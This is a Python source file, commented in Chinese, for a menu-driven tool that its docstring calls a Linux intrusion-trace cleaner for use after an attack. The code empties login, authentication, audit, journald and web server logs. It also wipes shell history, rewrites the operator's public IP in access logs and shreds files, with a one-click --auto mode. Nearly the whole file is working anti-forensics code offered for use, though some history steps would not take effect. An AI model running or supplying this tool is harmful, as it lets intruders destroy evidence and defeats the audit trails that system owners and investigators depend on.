#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Linux 入侵痕迹清理工具
用于在攻击结束后不留痕迹地清除日志和操作记录
"""

import os
import sys
import subprocess
import time
import shutil
from datetime import datetime

class LinuxCleaner:
    def __init__(self):
        self.current_user = os.getenv('USER')
        self.home_dir = os.path.expanduser('~')
        
    def print_banner(self):
        """打印工具横幅"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    Linux 入侵痕迹清理工具                      ║
║                     Linux Intrusion Cleaner                   ║
║                                                              ║
║  功能: 清除历史记录 | 系统日志 | Web日志 | 文件安全删除        ║
║  Features: History | System Logs | Web Logs | Secure Delete  ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def run_command(self, command, shell=True):
        """执行系统命令"""
        try:
            result = subprocess.run(command, shell=shell, capture_output=True, text=True)
            return result.returncode == 0, result.stdout, result.stderr
        except Exception as e:
            return False, "", str(e)
    
    def check_root(self):
        """检查是否为root用户"""
        if os.geteuid() != 0:
            print("⚠️  警告: 某些操作需要root权限才能执行")
            return False
        return True
    
    def clear_history(self):
        """清除历史命令记录"""
        print("\n🔍 正在清除历史命令记录...")
        
        # 方法1: 清除当前会话历史
        success, _, _ = self.run_command("history -c")
        if success:
            print("✅ 已清除当前会话历史记录")
        
        # 方法2: 清空.bash_history文件
        history_file = os.path.join(self.home_dir, '.bash_history')
        if os.path.exists(history_file):
            try:
                with open(history_file, 'w') as f:
                    f.write('')
                print("✅ 已清空 .bash_history 文件")
            except Exception as e:
                print(f"❌ 清空 .bash_history 失败: {e}")
        
        # 方法3: 设置环境变量不记录历史
        env_commands = [
            "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG",
            "export HISTFILE=/dev/null",
            "export HISTSIZE=0",
            "export HISTFILESIZE=0"
        ]
        
        for cmd in env_commands:
            self.run_command(cmd)
        print("✅ 已设置环境变量不记录历史")
        
        # 方法4: 清除其他shell历史文件
        other_history_files = [
            '.zsh_history',
            '.bash_sessions',
            '.python_history'
        ]
        
        for hist_file in other_history_files:
            file_path = os.path.join(self.home_dir, hist_file)
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"✅ 已删除 {hist_file}")
                except Exception as e:
                    print(f"❌ 删除 {hist_file} 失败: {e}")
    
    def clear_system_logs(self):
        """清除系统日志痕迹"""
        print("\n🔍 正在清除系统日志痕迹...")
        
        if not self.check_root():
            print("❌ 需要root权限才能清除系统日志")
            return
        
        # 系统日志文件列表
        log_files = {
            '/var/log/btmp': '登录失败记录',
            '/var/log/wtmp': '登录成功记录', 
            '/var/log/lastlog': '最后登录时间',
            '/var/log/utmp': '当前登录用户',
            '/var/log/secure': '安全日志',
            '/var/log/messages': '系统消息日志',
            '/var/log/auth.log': '认证日志',
            '/var/log/syslog': '系统日志'
        }
        
        for log_file, description in log_files.items():
            if os.path.exists(log_file):
                try:
                    # 清空日志文件
                    with open(log_file, 'w') as f:
                        f.write('')
                    print(f"✅ 已清空 {description} ({log_file})")
                except Exception as e:
                    print(f"❌ 清空 {log_file} 失败: {e}")
        
        # 清除journalctl日志
        success, _, _ = self.run_command("journalctl --vacuum-time=1s")
        if success:
            print("✅ 已清除journalctl日志")
        
        # 清除其他可能的日志目录
        log_dirs = ['/var/log/audit', '/var/log/apache2', '/var/log/nginx']
        for log_dir in log_dirs:
            if os.path.exists(log_dir):
                try:
                    for file in os.listdir(log_dir):
                        if file.endswith('.log'):
                            file_path = os.path.join(log_dir, file)
                            with open(file_path, 'w') as f:
                                f.write('')
                            print(f"✅ 已清空 {file_path}")
                except Exception as e:
                    print(f"❌ 清空 {log_dir} 失败: {e}")
    
    def clear_web_logs(self):
        """清除Web入侵痕迹"""
        print("\n🔍 正在清除Web入侵痕迹...")
        
        web_log_files = [
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log'
        ]
        
        for log_file in web_log_files:
            if os.path.exists(log_file):
                try:
                    # 获取当前IP地址
                    success, ip_output, _ = self.run_command("curl -s ifconfig.me")
                    current_ip = ip_output.strip() if success else "unknown"
                    
                    # 替换IP地址
                    self.run_command(f"sed -i 's/{current_ip}/192.168.1.1/g' {log_file}")
                    print(f"✅ 已替换IP地址 in {log_file}")
                    
                    # 清空日志文件
                    with open(log_file, 'w') as f:
                        f.write('')
                    print(f"✅ 已清空 {log_file}")
                    
                except Exception as e:
                    print(f"❌ 处理 {log_file} 失败: {e}")
    
    def secure_delete_file(self, file_path):
        """安全删除文件"""
        if not os.path.exists(file_path):
            print(f"❌ 文件不存在: {file_path}")
            return False
        
        print(f"🔍 正在安全删除文件: {file_path}")
        
        # 方法1: 使用shred命令
        success, _, _ = self.run_command(f"shred -f -u -z -v -n 8 {file_path}")
        if success:
            print(f"✅ 已使用shred安全删除: {file_path}")
            return True
        
        # 方法2: 使用dd命令覆盖
        try:
            file_size = os.path.getsize(file_path)
            self.run_command(f"dd if=/dev/zero of={file_path} bs=1M count={file_size//1024//1024 + 1}")
            os.remove(file_path)
            print(f"✅ 已使用dd覆盖并删除: {file_path}")
            return True
        except Exception as e:
            print(f"❌ dd删除失败: {e}")
        
        # 方法3: 使用wipe命令
        success, _, _ = self.run_command(f"wipe {file_path}")
        if success:
            print(f"✅ 已使用wipe删除: {file_path}")
            return True
        
        # 方法4: 使用srm命令
        success, _, _ = self.run_command(f"srm {file_path}")
        if success:
            print(f"✅ 已使用srm删除: {file_path}")
            return True
        
        print(f"❌ 所有安全删除方法都失败了: {file_path}")
        return False
    
    def secure_delete_directory(self, dir_path):
        """安全删除目录"""
        if not os.path.exists(dir_path):
            print(f"❌ 目录不存在: {dir_path}")
            return False
        
        print(f"🔍 正在安全删除目录: {dir_path}")
        
        try:
            # 先删除目录中的所有文件
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    self.secure_delete_file(file_path)
            
            # 删除空目录
            shutil.rmtree(dir_path)
            print(f"✅ 已安全删除目录: {dir_path}")
            return True
        except Exception as e:
            print(f"❌ 删除目录失败: {e}")
            return False
    
    def hide_ssh_traces(self):
        """隐藏SSH登录痕迹"""
        print("\n🔍 正在隐藏SSH登录痕迹...")
        
        # 清除SSH相关日志
        ssh_logs = [
            '/var/log/auth.log',
            '/var/log/secure',
            '/var/log/btmp',
            '/var/log/wtmp'
        ]
        
        for log_file in ssh_logs:
            if os.path.exists(log_file):
                try:
                    with open(log_file, 'w') as f:
                        f.write('')
                    print(f"✅ 已清空SSH日志: {log_file}")
                except Exception as e:
                    print(f"❌ 清空 {log_file} 失败: {e}")
        
        # 清除SSH密钥
        ssh_dir = os.path.join(self.home_dir, '.ssh')
        if os.path.exists(ssh_dir):
            print("⚠️  检测到SSH目录，建议手动检查并删除相关密钥")
    
    def clean_memory(self):
        """清理内存痕迹"""
        print("\n🔍 正在清理内存痕迹...")
        
        if not self.check_root():
            print("❌ 需要root权限才能清理内存")
            return
        
        # 清理内存缓存
        success, _, _ = self.run_command("sync && echo 3 > /proc/sys/vm/drop_caches")
        if success:
            print("✅ 已清理内存缓存")
        
        # 清理swap
        success, _, _ = self.run_command("swapoff -a && swapon -a")
        if success:
            print("✅ 已清理swap分区")
    
    def show_menu(self):
        """显示主菜单"""
        menu = """
╔══════════════════════════════════════════════════════════════╗
║                        主菜单 / Main Menu                      ║
╠══════════════════════════════════════════════════════════════╣
║  1. 清除历史命令记录 (Clear History Commands)                  ║
║  2. 清除系统日志痕迹 (Clear System Logs)                       ║
║  3. 清除Web入侵痕迹 (Clear Web Logs)                          ║
║  4. 安全删除文件 (Secure Delete File)                         ║
║  5. 安全删除目录 (Secure Delete Directory)                    ║
║  6. 隐藏SSH登录痕迹 (Hide SSH Traces)                         ║
║  7. 清理内存痕迹 (Clean Memory)                               ║
║  8. 一键清理所有痕迹 (Clean All Traces)                       ║
║  9. 退出 (Exit)                                               ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(menu)
    
    def interactive_mode(self):
        """交互式模式"""
        while True:
            self.show_menu()
            try:
                choice = input("请选择操作 (1-9): ").strip()
                
                if choice == '1':
                    self.clear_history()
                elif choice == '2':
                    self.clear_system_logs()
                elif choice == '3':
                    self.clear_web_logs()
                elif choice == '4':
                    file_path = input("请输入要删除的文件路径: ").strip()
                    if file_path:
                        self.secure_delete_file(file_path)
                elif choice == '5':
                    dir_path = input("请输入要删除的目录路径: ").strip()
                    if dir_path:
                        self.secure_delete_directory(dir_path)
                elif choice == '6':
                    self.hide_ssh_traces()
                elif choice == '7':
                    self.clean_memory()
                elif choice == '8':
                    print("\n🚀 开始一键清理所有痕迹...")
                    self.clear_history()
                    self.clear_system_logs()
                    self.clear_web_logs()
                    self.hide_ssh_traces()
                    self.clean_memory()
                    print("\n✅ 一键清理完成!")
                elif choice == '9':
                    print("\n👋 再见! Goodbye!")
                    break
                else:
                    print("❌ 无效选择，请重新输入")
                
                input("\n按回车键继续...")
                
            except KeyboardInterrupt:
                print("\n\n👋 用户中断，再见!")
                break
            except Exception as e:
                print(f"❌ 发生错误: {e}")
    
    def auto_clean(self):
        """自动清理模式"""
        print("\n🚀 开始自动清理所有痕迹...")
        start_time = time.time()
        
        self.clear_history()
        self.clear_system_logs()
        self.clear_web_logs()
        self.hide_ssh_traces()
        self.clean_memory()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n✅ 自动清理完成! 耗时: {duration:.2f} 秒")
        print("⚠️  建议重启系统以确保所有痕迹被完全清除")

def main():
    """主函数"""
    cleaner = LinuxCleaner()
    cleaner.print_banner()
    
    # 检查参数
    if len(sys.argv) > 1:
        if sys.argv[1] == '--auto':
            cleaner.auto_clean()
        elif sys.argv[1] == '--help':
            print("""
使用方法:
  python3 linux_cleaner.py          # 交互式模式
  python3 linux_cleaner.py --auto   # 自动清理模式
  python3 linux_cleaner.py --help   # 显示帮助
            """)
        else:
            print("❌ 无效参数，使用 --help 查看帮助")
    else:
        cleaner.interactive_mode()

if __name__ == "__main__":
    main()
